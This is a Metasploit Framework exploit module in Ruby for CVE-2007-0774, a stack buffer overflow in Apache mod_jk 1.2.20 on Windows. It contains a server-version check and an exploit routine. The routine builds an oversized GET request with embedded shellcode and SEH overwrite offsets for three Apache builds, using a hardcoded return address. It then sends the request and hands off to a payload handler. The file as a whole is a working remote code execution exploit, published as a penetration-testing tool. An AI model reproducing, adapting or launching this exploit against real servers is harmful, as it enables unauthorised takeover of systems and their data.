##
# $Id: apache_modjk_overflow.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Apache mod_jk 1.2.20 Buffer Overflow\',
			\'Description\'    => %q{
					This is a stack buffer overflow exploit for mod_jk 1.2.20.
				Should work on any Win32 OS.
			},
			\'Author\'         => \'Nicob <nicob[at]nicob.net>\',
			\'Version\'        => \'$Revision: 9929 $\',
			\'License\'        => MSF_LICENSE,
			\'References\'     =>
				[
					[ \'CVE\', \'2007-0774\' ],
					[ \'OSVDB\', \'33855\' ],
					[ \'BID\', \'22791\' ],
					[ \'URL\', \'http://www.zerodayinitiative.com/advisories/ZDI-07-008.html\' ]
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Privileged\'     => true,
			\'Payload\'        =>
				{
					\'Space\'    => 4000,
					\'BadChars\' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x23\\x25\\x26\\x2f\\x3b\\x3f\\x5c\",
					\'DisableNops\' => true
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					# POP/POP/RET in mod_jk 1.2.20 (Apache 1.3.37, 2.0.58 and 2.2.3)
					[\'mod_jk 1.2.20 (Apache 1.3.x/2.0.x/2.2.x) (any win32 OS/language)\', { \'Ret\' => 0x6a6b8ef1 }],
				],
			\'DefaultTarget\'  => 0,
			\'DisclosureDate\' => \'Mar 02 2007\'))

		register_options(
			[
				Opt::RPORT(80)
			], self.class)
	end

	def check
		connect

		sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")
		resp = sock.get_once
		disconnect

			if (resp and (m = resp.match(/Server: Apache\\/(.*) \\(Win32\\)(.*) mod_jk\\/1.2.20/))) then
				print_status(\"Apache version detected : #{m[1]}\")
				return Exploit::CheckCode::Appears
			else
				return Exploit::CheckCode::Safe
			end
	end

	def exploit
		connect

		uri_start  = \"GET /\"
		uri_end    = \".html HTTP/1.0\\r\\n\\r\\n\"
		sc_base    = 16

		shellcode  = payload.encoded
		sploit     = rand_text_alphanumeric(5001)
		sploit[sc_base, shellcode.length] = shellcode

		# 4343 : Apache/1.3.37 (Win32) mod_jk/1.2.20
		# 4407 : Apache/2.0.59 (Win32) mod_jk/1.2.20
		# 4423 : Apache/2.2.3  (Win32) mod_jk/1.2.20

		[ 4343, 4407, 4423 ].each { |seh_offset|
			sploit[seh_offset - 9, 5] = \"\\xe9\" + [sc_base - seh_offset + 4].pack(\'V\')
			sploit[seh_offset - 4, 2] = \"\\xeb\\xf9\"
			sploit[seh_offset    , 4] = [ target.ret ].pack(\'V\')
		}

		print_status(\"Trying target #{target.name}...\")
		sock.put(uri_start + sploit + uri_end)

		resp = sock.get_once
		if (resp and (m = resp.match(/<title>(.*)<\\/title>/i)))
			print_error(\"The exploit failed : HTTP Status Code \'#{m[1]}\' received :-(\")
		end

		handler
		disconnect
	end

end
